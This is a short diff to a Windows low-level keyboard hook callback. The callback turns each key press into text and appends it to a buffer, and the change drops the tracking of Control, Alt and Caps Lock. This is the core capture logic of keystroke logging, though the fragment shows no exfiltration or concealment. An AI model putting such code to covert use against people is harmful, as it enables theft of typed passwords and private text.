@@ -55,12 +55,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             UINT vKey = pKeyStruct->vkCode;
             UINT scanCode = pKeyStruct->scanCode;
-            // update keyboard state manually
             BYTE keyboardState[256] = {0};
             keyboardState[VK_SHIFT] = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 0x80 : 0;
-            keyboardState[VK_CONTROL] = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 0x80 : 0;
-            keyboardState[VK_MENU] = (GetAsyncKeyState(VK_MENU) & 0x8000) ? 0x80 : 0;
-            keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) ? 0x01 : 0;
             textBuffer += getStrFromVKey(vKey, scanCode, keyboardState); 
             if (textBuffer.size() > maxTextBuffer)
             {
